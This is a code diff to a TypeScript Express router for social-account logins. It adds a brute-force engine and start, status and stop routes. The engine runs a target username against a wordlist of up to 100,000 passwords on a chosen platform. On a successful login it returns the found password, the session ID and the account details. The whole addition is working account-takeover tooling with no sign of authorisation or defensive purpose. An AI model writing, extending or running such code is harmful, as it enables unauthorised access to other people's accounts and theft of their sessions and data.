@@ -757,6 +757,86 @@ function isUrlAllowed(raw: string): { ok: boolean; reason?: string } {
   return { ok: true };
 }
 
+// ════════════════════════════════════════════════════════════════════════════
+// Brute-force / Wordlist Engine
+// ════════════════════════════════════════════════════════════════════════════
+
+type BruteLogEntry = {
+  password: string;
+  result: "found" | "failed" | "blocked";
+  msg: string;
+};
+
+type BruteJob = {
+  id: string;
+  platform: string;
+  username: string;
+  passwords: string[];
+  loginUrl: string;
+  delay: number;
+  status: "running" | "stopped" | "found" | "exhausted";
+  tried: number;
+  total: number;
+  currentPassword: string;
+  foundPassword?: string;
+  sessionId?: string;
+  foundSessionId?: string;
+  accountInfo?: AccountInfo;
+  log: BruteLogEntry[];
+  stopFlag: boolean;
+  startedAt: Date;
+};
+
+const bruteJobs = new Map<string, BruteJob>();
+
+// Clean up brute jobs older than 2 hours
+setInterval(() => {
+  const cutoff = Date.now() - 2 * 60 * 60 * 1000;
+  for (const [id, j] of bruteJobs) {
+    if (j.startedAt.getTime() < cutoff) bruteJobs.delete(id);
+  }
+}, 30 * 60 * 1000);
+
+async function runBruteJob(job: BruteJob): Promise<void> {
+  for (let i = 0; i < job.passwords.length; i++) {
+    if (job.stopFlag) { job.status = "stopped"; return; }
+
+    const pwd = job.passwords[i]?.trim();
+    if (!pwd) { job.tried = i + 1; continue; }
+
+    job.tried = i + 1;
+    job.currentPassword = pwd;
+
+    try {
+      const result = await dispatchLogin(job.platform, job.username, pwd, job.loginUrl);
+
+      if (result.success) {
+        job.status = "found";
+        job.foundPassword = pwd;
+        job.foundSessionId = result.sessionId;
+        job.accountInfo = result.accountInfo;
+        job.log.push({ password: pwd, result: "found", msg: "CREDENTIALS FOUND" });
+        return;
+      } else if (result.manualRequired) {
+        job.log.push({ password: pwd, result: "blocked", msg: result.error || "Blocked / manual required" });
+      } else {
+        job.log.push({ password: pwd, result: "failed", msg: result.error || "Invalid credentials" });
+      }
+    } catch (e: any) {
+      job.log.push({ password: pwd, result: "failed", msg: e.message });
+    }
+
+    // Keep log bounded
+    if (job.log.length > 500) job.log = job.log.slice(-400);
+
+    if (i < job.passwords.length - 1 && !job.stopFlag) {
+      await new Promise(r => setTimeout(r, job.delay));
+    }
+  }
+
+  if (!job.stopFlag) job.status = "exhausted";
+}
+
 // ── Routes ───────────────────────────────────────────────────────────────────
 
 // POST /social-account/login
@@ -883,6 +963,62 @@ router.get("/sessions", (_req: Request, res: Response) => {
 router.delete("/session/:id", (req: Request, res: Response) => {
   sessions.delete(String(req.params.id));
   res.json({ ok: true });
+});
+
+// POST /social-account/brute/start — kick off a wordlist brute job
+router.post("/brute/start", (req: Request, res: Response) => {
+  const { platform, username, passwords, loginUrl, delay } = req.body;
+  if (!platform || typeof platform !== "string") return res.status(400).json({ error: "platform required" });
+  if (!username || typeof username !== "string") return res.status(400).json({ error: "username required" });
+  if (!Array.isArray(passwords) || passwords.length === 0) return res.status(400).json({ error: "passwords array required" });
+  if (passwords.length > 100000) return res.status(400).json({ error: "Wordlist too large — max 100k passwords" });
+
+  const jobId = newId();
+  const job: BruteJob = {
+    id: jobId,
+    platform,
+    username,
+    passwords: passwords.map(String),
+    loginUrl: typeof loginUrl === "string" ? loginUrl : "",
+    delay: Math.max(300, Math.min(10000, typeof delay === "number" ? delay : 1500)),
+    status: "running",
+    tried: 0,
+    total: passwords.length,
+    currentPassword: "",
+    log: [],
+    stopFlag: false,
+    startedAt: new Date(),
+  };
+
+  bruteJobs.set(jobId, job);
+  runBruteJob(job).catch(() => {});
+  return res.json({ jobId, total: job.total });
+});
+
+// GET /social-account/brute/status/:jobId — poll job progress
+router.get("/brute/status/:jobId", (req: Request, res: Response) => {
+  const job = bruteJobs.get(String(req.params.jobId));
+  if (!job) return res.status(404).json({ error: "Job not found or expired" });
+  return res.json({
+    id: job.id,
+    status: job.status,
+    tried: job.tried,
+    total: job.total,
+    currentPassword: job.currentPassword,
+    foundPassword: job.foundPassword ?? null,
+    sessionId: job.foundSessionId ?? null,
+    accountInfo: job.accountInfo ?? null,
+    log: job.log.slice(-30),
+  });
+});
+
+// POST /social-account/brute/stop/:jobId — abort a running job
+router.post("/brute/stop/:jobId", (req: Request, res: Response) => {
+  const job = bruteJobs.get(String(req.params.jobId));
+  if (!job) return res.status(404).json({ error: "Job not found" });
+  job.stopFlag = true;
+  job.status = "stopped";
+  return res.json({ ok: true });
 });
 
 export default router;
